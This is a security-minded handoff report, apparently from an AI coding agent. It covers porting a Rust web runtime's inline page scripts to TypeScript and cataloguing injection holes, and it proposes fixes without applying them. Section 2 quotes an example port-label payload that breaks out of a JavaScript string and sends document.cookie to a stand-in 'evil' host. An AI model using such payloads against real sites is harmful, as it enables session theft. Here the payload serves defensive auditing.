# Area 03 of 10: page-specific scripts. Handoff

**Verdict: Convert.** Every page-specific script in `RUST-RUNTIME/src/html.rs` is now a typed TypeScript entry module that builds to a single IIFE bundle per page. These bundles can replace the Rust raw-string consts and the `format!`-built `<script>` blocks, which have `{{ }}`-doubled braces. The code is a faithful port. Where the original would throw, the TS keeps that behaviour with `!` assertions. Latent bugs are marked `LATENT (preserved)` in the code and listed below. They have not been fixed. Each server-to-client injection now has a typed interface and a JSON data-island reader that falls back to the legacy `window.X` global, so the TS works against both the current Rust and the proposed Rust.

Nothing outside `TYPESCRIPT/pages/` has been edited.

## Scope

`html.rs` line numbers are from a snapshot taken at 2026-10-21 14:00. The file is being edited concurrently and moved by +32 lines while this audit ran, so search for the function names instead of relying on the numbers.

| Block | html.rs lines | Host page fn | TS entry |
|---|---|---|---|
| `DISCOVERY_JS` const | 1604–1652 | `globe_page` (1555), `continents_page` (2407) | `src/lib/discovery.ts` → `entries/globe.ts`, `entries/continents.ts` |
| `<script>{disc}</script>` on Globe | 1585 | `globe_page` | `entries/globe.ts` |
| Continents `TC.onStatus` hook (format!, `{{ }}`) | 2545–2546 | `continents_page` | `entries/continents.ts` |
| `window.LIGHTS0` injection | 1716 | `panels_page` (1659) | `lib/island.ts` (`tc-lights0`) |
| Light-board IIFE (format!, `{{ }}`) | 1823–1851 | `panels_page` | `entries/panels.ts` |
| `EDITOR_JS` const | 1946–1958 | `panel_editor_page` (2106, used at 2282) | `entries/panel-editor.ts` |
| Overlord lane/bucket IIFE (format!, `{{ }}`) | 2874–2883 | `overlord_page` (2660) | `entries/overlord.ts` |
| Racks map-filter IIFE (format!, `{{ }}`) | 3123–3130 | `racks_page` (2920) | `entries/racks.ts` |
| `RELAY_JS` const | 3147–3205 | `relay_page` (3207) | `entries/relay.ts` |
| `window.RELAY_*` injection | 3224 | `relay_page` | `lib/island.ts` (`tc-relay-*`) |
| Injections owned by others, catalogued only | 440 (`page`), 1148 (`map_block`) | — | — |
| Inline `on*=` handlers, audited and not ported | 27 sites (see Findings §3) | many | — |

The wire shapes were transcribed from `runtime.rs` (`tree()`, `device()`, `lines()`, `continent_totals()`, `status_message()`, `globe_message()`), from `html.rs` (`lights_json()`, `globe_data()` callList), and from `TRUNK-CASTER-SDK/src/types.rs` (`Badge`, `Frame`, `RelayBinding`, `RemoteFrame`, `UserRecord`/`ReplyStatus`), `labels.rs` (`Label`) and `sites.rs` (`Tier`).

About 171 lines of embedded JS were audited, plus the roughly 900 lines of Rust page functions that host and feed them.

## Injection catalogue (server → client)

| # | Where | Injection today | Type (`src/wire.ts`) | Proposed island | Hazard |
|---|---|---|---|---|---|
| 1 | `page()` 440 | `const REFRESH_MS={refresh_ms};` | `number` | `<script type="application/json" id="tc-page">{"refresh_ms":…,"build":…}</script>` (agent 01) | u32, safe |
| 2 | `page()` 440 | `const BUILD="{build}";` | `string` | same `tc-page` | compile-time env, safe unless it contains `"` |
| 3 | `map_block` 1148 | `window.GLOBE_DEFAULT_MODE='{mode}'` | `'both'\|'globe'\|'map'` | `tc-globe-mode` (agent 02) | **Stored script injection.** `mode` is `GlobeConfig.projection`, which is a free string POSTed to `/api/globe/config` and spliced raw into a single-quoted JS string |
| 4 | `map_block` 1148 | `window.GLOBE_LAYERS={layers}` | `string[] \| null` | `tc-globe-layers` | static, safe |
| 5 | `map_block` 1148 | `window.GLOBE_HUB={hub}` | object \| null | `tc-globe-hub` | `</script>` breakout if a hub string ever contains it |
| 6 | `map_block` 1148 | `window.GLOBE_FILTER=window.GLOBE_FILTER\|\|new Set()` | `Set<string>` | not data: keep as client init | — |
| 7 | `map_block` 1148 | `window.GLOBE_DATA={data}` | `globe_data()` (agent 02/04) | `tc-globe-data` | **`</script>` breakout.** callList carries `who`/`why` from the unauthenticated `POST /api/request`. A caller named `</script><script>…` breaks every map page |
| 8 | `map_block` 1148 | `window.TC_LAND={LAND_JSON}` | land GeoJSON | serve as `/assets/land.json` or `tc-land` | static include, safe |
| 9 | `panels_page` 1716 | `<script>window.LIGHTS0={}</script>` | `LightsJson` | `tc-lights0` | `</script>` breakout via frame ids (remote simulators announce frames over CHECKIN) |
| 10 | `relay_page` 3224 | `window.RELAY_THRESHOLD={thr}` | `number` | `tc-relay-threshold` | f64 `Display` prints `inf`/`NaN`, which become a ReferenceError or NaN. Not reachable through serde today |
| 11 | `relay_page` 3224 | `window.RELAY_MATRICES={matrices}` | `RelayMatrixLite[]` | `tc-relay-matrices` | labels come from `relay.json`. They are also put into `<option>` unescaped (see §2) |
| 12 | `relay_page` 3224 | `window.RELAY_BOUND={bound}` | `Record<"m:p", RelayBinding>` | `tc-relay-bound` | **`</script>` breakout.** `device_label` comes from the unauthenticated `POST /api/relay/bind` |

`serde_json::to_string` does not escape `<`, `/`, U+2028 or U+2029. That is why every JSON-in-`<script>` splice above can be broken out of. The islands still need escaping, but escaping `<` inside JSON is enough. The proposed Rust helper below is **not applied**:

```rust
/// A JSON data island the page scripts read with readIsland(id).
fn json_island(id: &str, v: &impl serde::Serialize) -> String {
    let s = serde_json::to_string(v).unwrap_or_else(|_| "null".into())
        .replace('<', "\\u003c").replace('>', "\\u003e").replace('&', "\\u0026")
        .replace('\u{2028}', "\\u2028").replace('\u{2029}', "\\u2029");
    format!(r#"<script type="application/json" id="{}">{s}</script>"#, esc(id))
}
```

## Findings

### 1. Stale DOM references after an in-place refresh (most impactful)
`refreshMain()` (core JS) replaces `<main>.innerHTML` and **never re-runs page scripts**. It only preserves `canvas[id]`, `.tip[id]` and `[data-keep][id]`. Any page script that captures an element once therefore loses it on the first refresh:

| Page (refresh) | What breaks | Fix |
|---|---|---|
| Continents (8 s) | `#tree` was captured once, so after 8 s the visible tree reverts to "loading…" and device clicks stop working | look up `#tree` inside `render()`, or add `data-keep` to `#tree` |
| Overlord (3 s) | `#lane` and `#bucket` were captured, so the Messages section goes blank after 3 s | add `data-keep` to `#lane` and `#bucket` |
| Racks (5 s) | `.rack` hover and toggle listeners are lost after 5 s, so map filtering only follows `onMain` | delegate `mouseover`/`toggle` from `document` |
| Relay (4 s) | the `#relay-start` listener is lost, so pressing Start more than ~4 s after load does nothing. Once started, the meters paint detached rows and the table shows "press Start" | add `data-keep` to `#devices`, `#pair-offer` and `#relay-start`, or have the relay page pass `refresh_ms` 0 |

The Panels light board and the Continents status hook already look elements up every time, as their comments say, so they are safe. Globe passes `refresh_ms`=0, so it is only affected by `reload()` after an action.

### 2. Escaping hazards in `format!`-built JS
- **Stored script injection through port names.** `esc()` (`util.rs:141`) escapes `& < > "` but **not `'` or `\`**. Several inline handlers put `esc(..)` output inside single-quoted JS strings:
  - Racks 3094 `connect('{id}',{i},'{name}')`, where `name` is a user-renamed port label (`/api/rename`, "emoji welcome").
  - Relay 3300 `connect('…','…','{p.name}')`.
  - Panels 1789, Relay 3290 and Racks `rename('{f.id}',…)`.
  - Editor 2247 and 2249 `renamePort('{id}',…)` and `bookPort('{id}',…)`.
  - Usage 966 `/api/gain {trunk:'{id}'}`, 3059 and 3299 `/api/release {id:'{c}'}`, Simulator 3829 `/api/fader/preset {id:'{id}'}`.

  A label such as `x');fetch('//evil?'+document.cookie);('` runs JS on click. The fix is to emit JS literals with `esc(&serde_json::to_string(v)?)`. Inside an attribute, `&quot;` decodes back to `"`. Alternatively, move to `data-*` attributes and delegated listeners.
- `{{ }}` doubling. The four `format!` script blocks (Continents, Panels, Overlord, Racks) disappear entirely when they become `{PAGE_JS}` arguments, so no more brace doubling.
- RELAY_JS builds `<option>` with `${m.label}` and `${m.id}` unescaped (labels come from `relay.json`).
- Overlord `col()` builds a CSS selector from `proto` (`'[data-proto="'+proto+'"]'`), so a protocol name containing `"` or `]` throws.

### 3. Inline handlers (27 sites, audited and not ported)
Inline handlers are part of each page function's HTML, so they belong to whoever retires inline JS. The ones that share the quote-injection hazard are listed in §2. The editor's `findInTree`, `renamePort` and `bookPort` are published on `window` by `panel-editor.ts`, so the existing handlers keep working.

### 4. Bugs the types exposed
- **Overlord**: `call.hops[0][0]` (`noUncheckedIndexedAccess`) throws when `hops` is empty and `from_site` is `""` or null. That happens for a call that never left a site-less frame, and it kills the whole `onGlobe` handler for that frame.
- **Discovery device panel**: `DeviceTrunk.caster` is `Option<usize>`, so the page can print `Cnull`. `t.peer` is `Option<String>`, which `esc` already turns into `''`.
- **Discovery**: `/api/device/'+encodeURIComponent(id)`, but `http.rs` never percent-decodes the path. Any id that encoding changes returns 404.
- **Editor**: `api()` returns raw text when the body is not JSON, so `'booked '+r.id` shows "booked undefined · undefined". `renamePort` also calls `reload()` after an error.
- **Relay**: pressing Start twice opens every stream twice and starts a second `requestAnimationFrame` loop. A device with an empty label (before permission is granted) matches any binding whose `device_label` is also empty. `RELAY_JS` redeclares `esc` locally without null handling. This is harmless here because every call passes a string, and it is kept as `relayEsc`.

### 5. Deviations from the original
- Panels: `conns[el.dataset.id ?? '']`. The original indexed with `undefined`, which becomes the key `"undefined"`, and `data-id` is always rendered, so the difference is unreachable.
- No other behavioural deviations. The new code adds island-first reads that fall back to the same globals.

## Files built (`TYPESCRIPT/pages/`)

| File | Lines | Role |
|---|---|---|
| `tsconfig.json` | 10 | extends `../tsconfig.base.json`; lib ES2022, DOM, DOM.Iterable |
| `src/globals.d.ts` | 64 | ambient core (`TC`, `api`, `esc`, `dur`, `val`, `num`, `show`, `reload`, `setText`, `cacheGet`/`cacheSet`, `connect`, `rename`, `LIVE`, `REFRESH_MS`, `BUILD`) plus the `Window` injections |
| `src/wire.ts` | 310 | local wire types (tree, device, lines, continents, lights, callList, relay, booking reply). **Dedup with agent 04** |
| `src/lib/island.ts` | 29 | `readIsland<T>(id)`, `island<T>(id, legacy)`, `ISLANDS` ids |
| `src/lib/discovery.ts` | 166 | DISCOVERY_JS port, as `initDiscovery()` |
| `src/entries/globe.ts` | 5 | Globe page: discovery |
| `src/entries/continents.ts` | 35 | Continents page: discovery and the live side panels |
| `src/entries/panels.ts` | 99 | Panels light board |
| `src/entries/panel-editor.ts` | 55 | EDITOR_JS; publishes `bookPort`, `renamePort` and `findInTree` on `window` |
| `src/entries/overlord.ts` | 80 | Overlord message lane and bucket |
| `src/entries/racks.ts` | 32 | Racks map filter |
| `src/entries/relay.ts` | 226 | RELAY_JS (Web Audio VU meters, binding, pairing, over-threshold events) |
| `build.mjs` | 10 | esbuild: every entry to `dist/<page>.js`, IIFE, es2020 |
| `dist/*.js` | 7 files, 31 KB | build proof: all pass `node --check`, and none contains `</script` |

## Typecheck

Run from `TYPESCRIPT/`:

```
$ node node_modules/typescript/bin/tsc -p pages; echo "exit=$?"
exit=0
```

Build:
```
$ node pages/build.mjs
  pages\dist\relay.js       9.0kb
  pages\dist\continents.js  7.3kb
  pages\dist\globe.js       6.1kb
  pages\dist\panels.js      3.8kb
  pages\dist\overlord.js    2.2kb
  ...and 2 more output files...   (panel-editor.js 1.6kb, racks.js 0.8kb)
Done
```

## How to wire it in (NOT applied)

1. Build: `cd TYPESCRIPT && node pages/build.mjs`. Either commit `pages/dist/` or have `RUST-RUNTIME/build.rs` run this step and `rerun-if-changed=../TYPESCRIPT/pages/src`.
2. In `html.rs`, add one const per bundle next to the old ones:
   ```rust
   const PAGE_GLOBE_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/globe.js");
   const PAGE_CONTINENTS_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/continents.js");
   const PAGE_PANELS_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/panels.js");
   const PAGE_EDITOR_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/panel-editor.js");
   const PAGE_OVERLORD_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/overlord.js");
   const PAGE_RACKS_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/racks.js");
   const PAGE_RELAY_JS: &str = include_str!("../../TYPESCRIPT/pages/dist/relay.js");
   ```
3. Replace the blocks:
   - `globe_page`: `disc = DISCOVERY_JS` becomes `disc = PAGE_GLOBE_JS`.
   - `continents_page`: delete the second `<script>TC.onStatus…</script>` (2546) and set `disc = PAGE_CONTINENTS_JS`.
   - `panels_page`: replace the `<script>(function(){{ … }})();</script>` (1823–1851) with `<script>{PAGE_PANELS_JS}</script>`. Replace 1716 with `b.push_str(&json_island("tc-lights0", &lights_json(rt)));`.
   - `panel_editor_page`: `<script>{EDITOR_JS}</script>` becomes `<script>{PAGE_EDITOR_JS}</script>`.
   - `overlord_page`: replace 2874–2883 with `<script>{PAGE_OVERLORD_JS}</script>`.
   - `racks_page`: replace 3123–3130 with `<script>{PAGE_RACKS_JS}</script>`.
   - `relay_page`: replace 3224 with `{i1}{i2}{i3}<script>{PAGE_RELAY_JS}</script>`, where `i1 = json_island("tc-relay-threshold", &thr)`, `i2 = json_island("tc-relay-matrices", &matrices)` and `i3 = json_island("tc-relay-bound", &bound)`. Keep each island **before** its bundle.
4. Delete `DISCOVERY_JS`, `EDITOR_JS` and `RELAY_JS` once nothing references them.
5. Optional fixes, shipped separately from the port so they can be reviewed: the `data-keep` and lookup fixes from §1, and replacing `'{esc(x)}'` in inline handlers with `{esc(&serde_json::to_string(x))}` from §2.
6. Smoke test each page live. Check that the tree fills, the light board ticks, Overlord chips land, the racks hover filters the map, Relay Start meters, and an editor rename or booking works.

The bundles depend on the core `JS` globals. These are defined in `<head>` before the page body, so load order is unchanged. Each bundle is a self-contained IIFE, so its top-level names do not leak, apart from the three editor functions that are published deliberately.

## Risks

- `html.rs` is being edited concurrently, so the line numbers above will drift. Anchor on the function names.
- `include_str!` of a generated file means `cargo build` fails until `node pages/build.mjs` has run. Decide between committing `dist/` and running the build from `build.rs`.
- `globals.d.ts` guesses agent 01's signatures (`api(): Promise<unknown>`, `esc(unknown)`). Reconcile when web-core lands.
- `wire.ts` overlaps agent 04's SDK types. Nullability follows `skip_serializing_if` and `Option` exactly as read, but these are hand-transcribed and not generated.
- The ports keep the latent bugs on purpose. Fixing §1 and §2 changes visible behaviour and should be a reviewed follow-up.

## Open questions

1. Should Relay keep in-place refresh at all? The VU meters are a live drawing, and the simplest fix is `refresh_ms` 0 for `/relay`.
2. Should page bundles be inlined with `include_str!`, or served as `/assets/<page>.js` and cached by `BUILD`? Inlining keeps static snapshot exports (`live=false`) self-contained.
3. Should the agent 02 islands (`GLOBE_*`, `TC_LAND`) adopt the same `tc-` id scheme and `json_island` helper?

## Next steps

- Agent 01: export the core globals as types so `globals.d.ts` can be deleted.
- Agent 04: publish the tree, device, lines and lights types, then switch `wire.ts` to `import type`.
- Agent 02: fix injection #3 (`GLOBE_DEFAULT_MODE`) and move #7 (`GLOBE_DATA`) to an island. These are the two live injection holes.
- Apply the wiring steps after the concurrent `html.rs` session settles, then the §1 and §2 fixes as a separate change.
